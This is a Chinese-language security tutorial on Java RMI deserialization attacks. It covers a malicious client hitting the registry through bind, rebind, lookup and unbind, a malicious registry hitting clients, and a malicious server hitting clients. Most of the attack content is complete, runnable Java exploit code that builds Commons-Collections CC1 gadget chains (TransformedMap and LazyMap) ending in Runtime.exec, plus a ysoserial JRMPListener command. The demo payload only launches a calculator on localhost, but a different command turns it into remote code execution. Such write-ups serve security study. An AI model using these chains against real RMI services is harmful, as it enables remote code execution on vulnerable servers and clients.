Java 反序列化 RMI 篇 RMI 攻击

经过分析可以发现在客户端、注册中心、服务端均存在可以反序列化的地方

具体的几种攻击方式

  • RMI Client 打 RMI Registry
  • RMI Client 打 RMI Server
  • RMI Server 打 RMI Client

1. 攻击 Registry

通过客户端攻击注册中心

通过查看 ReigstryImpl_Skel 的源码可知，客户端与注册中心的交互 5 种方式

  • bind
  • list
  • lookup
  • rebind
  • unbind

其中 list 交互中只有序列化方式而没有反序列化方式

所以这种方法没法进行进一步利用也就不考虑了

1.1 利用 bind & rebind

  • bind 部分代码

  • rebind 部分代码

这两个地方反序列化的内容为参数是参数名以及远程对象

在使用 Registry 时，首先由 Server 端向 Registry 端绑定服务对象，这个对象是一个 Server 端生成的动态代理类，Registry 端会反序列化这个类对象并存在自己的 RegistryImpl 的 bindings 中，以供后续的查询。所以如果我们是一个恶意的 Server 端，向 Registry 端输送了一个恶意的对象，在其反序列化时就可以触发恶意调用。

如果服务端存在 CC 链相关的漏洞那么就可以进行反序列化攻击

导入一个 commons-collections 3.2.1

<dependency>  
    <groupId>commons-collections</groupId>  
    <artifactId>commons-collections</artifactId>  
    <version>3.2.1</version>  
</dependency>
  • 手动构造

在 bind 中的对象要求为 Remote类型，而且在 CC1 中利用到的 AnnotationInvocationHandler 为 InvocationHandler，因此可以通过动态代理将其和新建的 Remote 对象绑定从而触发反序列化

InvocationHandler chainhandler = (InvocationHandler) constructor.newInstance(Target.class, transformermap);
Remote remote = (Remote) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{Remote.class}, chainhandler);
package org.example.server;  
  
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.map.TransformedMap;  
  
import java.lang.annotation.Target;  
import java.lang.reflect.Constructor;  
import java.lang.reflect.InvocationHandler;  
import java.lang.reflect.Proxy;  
import java.rmi.Remote;  
import java.rmi.registry.LocateRegistry;  
import java.rmi.registry.Registry;  
import java.util.HashMap;  
import java.util.Map;  
  
public class SAR {  
    public static void main(String[] args) throws Exception {  
	    // 获取远程Registry
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);  
        // CC1 链  
        Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(Runtime.class),  
                new InvokerTransformer("getMethod",  
                        new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),  
                new InvokerTransformer("invoke"  
                        , new Class[]{Object.class, Object[].class}, new Object[]{null, null}),  
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})  
        };  
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
        HashMap<Object, Object> hashMap = new HashMap<>();  
        hashMap.put("value", "value");  
        Map<Object, Object> transformedMap = TransformedMap.decorate(hashMap, null, chainedTransformer);  
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  
        Constructor aihConstructor = c.getDeclaredConstructor(Class.class, Map.class);  
        aihConstructor.setAccessible(true);  
        InvocationHandler handler = (InvocationHandler) aihConstructor.newInstance(Target.class, transformedMap);  
        // 利用动态代理生成包含 AnnotationInvocationHandler 的 Remote 对象
        Remote remote = (Remote) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Remote.class}, handler);  
        // 绑定
        registry.bind("test", remote);  
        // 重绑定
	    // registry.bind("test", remote);  
    }  
}

1.2 利用 unbind & lookup

这里 lookup 与 unbind 传入的参数为一个 String 类型，所以想要利用的话还得伪造一个 lookup 或者 unbind 请求传入一个对象，这样才能实现反序列化攻击

具体的 lookup 实现代码

具体执行 lookup 的部分，将 String 类型序列化写入，显然不可控，但是知道了 lookup 的处理流程不妨手动构造一个序列化写入并执行的过程

先调用 UnicastRef.newCall() 建立链接，然后打开输出流写入序列化内容，最后发送

package org.example.client;  
  
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.map.TransformedMap;  
import sun.rmi.server.UnicastRef;  
  
import java.io.IOException;  
import java.io.ObjectOutput;  
import java.lang.annotation.Target;  
import java.lang.reflect.*;  
import java.rmi.Remote;  
import java.rmi.RemoteException;  
import java.rmi.registry.LocateRegistry;  
import java.rmi.registry.Registry;  
import java.rmi.server.Operation;  
import java.rmi.server.RemoteCall;  
import java.rmi.server.RemoteObject;  
import java.util.Arrays;  
import java.util.HashMap;  
import java.util.Map;  
  
public class CAR {  
    public static void main(String[] args) throws Exception {  
// 获取远程Registry  
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);  
        // CC1 链  
        Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(Runtime.class),  
                new InvokerTransformer("getMethod",  
                        new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),  
                new InvokerTransformer("invoke"  
                        , new Class[]{Object.class, Object[].class}, new Object[]{null, null}),  
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})  
        };  
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
        HashMap<Object, Object> hashMap = new HashMap<>();  
        hashMap.put("value", "value");  
        Map<Object, Object> transformedMap = TransformedMap.decorate(hashMap, null, chainedTransformer);  
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  
        Constructor aihConstructor = c.getDeclaredConstructor(Class.class, Map.class);  
        aihConstructor.setAccessible(true);  
        InvocationHandler handler = (InvocationHandler) aihConstructor.newInstance(Target.class, transformedMap);  
        // 利用动态代理生成包含 AnnotationInvocationHandler 的 Remote 对象  
        Remote remote = (Remote) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Remote.class}, handler);  
  
        // 获取注册中心的 LiveRef 用于构造 UnicastRef 建立链接  
        Field refField = registry.getClass().getSuperclass().getSuperclass().getDeclaredField("ref");  
        refField.setAccessible(true);  
        UnicastRef unicastRef = (UnicastRef) refField.get(registry);  
  
        // 获取 newCall 中所需的 ops 参数  
        Field operationsField = registry.getClass().getDeclaredField("operations");  
        operationsField.setAccessible(true);  
        Operation[] operations = (Operation[]) operationsField.get(registry);  
  
        // 调用 newCall 建立链接  
        // lookup - 2
        RemoteCall remoteCall = unicastRef.newCall((RemoteObject) registry, operations, 2, 4905912898345647071L);  
        // unbind - 4
	    // RemoteCall remoteCall = unicastRef.newCall((RemoteObject) registry, operations, 4, 4905912898345647071L);
        // 调用输出流写入序列化内容  
        ObjectOutput outputStream = remoteCall.getOutputStream();  
        outputStream.writeObject(remote);  
        // ，将内容发送  
        unicastRef.invoke(remoteCall);  
    }  
}

2. 攻击 Client

从之前的分析可知客户端会将从注册中心与服务端接受到的数据反序列化

先看一下注册中心如何攻击客户端

2.1 注册中心攻击客户端

还是上面提到的那几个方法，这里除了 unbind 与 rebind 方法，其他几个都会返回数据给客户端

如果能够控制该部分的返回内容则有可能攻击客户端

这里直接利用 ysoserial 开一个监听

java -cp .\ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener  1099 CommonsCollections1 "calc"

客户端链接

2.2 服务端攻击客户端

由于客户端会将服务端返回过来的数据进行反序列化，所以让服务端返回一个构造好的恶意对象即可

  • User 接口

package org.example.server;  
  
import java.lang.annotation.Target;  
import java.rmi.RemoteException;  
import java.rmi.server.UnicastRemoteObject;  
  
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.map.LazyMap;  
  
import java.lang.reflect.Constructor;  
import java.lang.reflect.InvocationHandler;  
import java.lang.reflect.Proxy;  
import java.util.HashMap;  
import java.util.Map;  
  
public class UserImpl extends UnicastRemoteObject implements User {  
  
    protected UserImpl() throws RemoteException {  
    }  
    @Override  
    public Object getUser() throws Exception {  
	    // CC1 - LazyMap
        // Runtime.exec  
        Transformer[] transformers = {  
                new ConstantTransformer(Runtime.class),  
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),  
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),  
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})  
        };  
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
        // 被修饰的 Map        
        HashMap<Object, Object> hashMap = new HashMap<>();  
        // 实例化 LazyMap        
        Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);  
        // 实例化 AnnotationInvocationHandler        
        Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  
        Constructor<?> constructor = clazz.getDeclaredConstructor(Class.class, Map.class);  
        constructor.setAccessible(true);  
        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, lazyMap);  
        // 代理  
        Map proxyMap = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, invocationHandler);  
        // 将代理插入到 AnnotationInvocationHandler 中  
        invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, proxyMap);  
  
        return (Object) invocationHandler;  
    }  
}
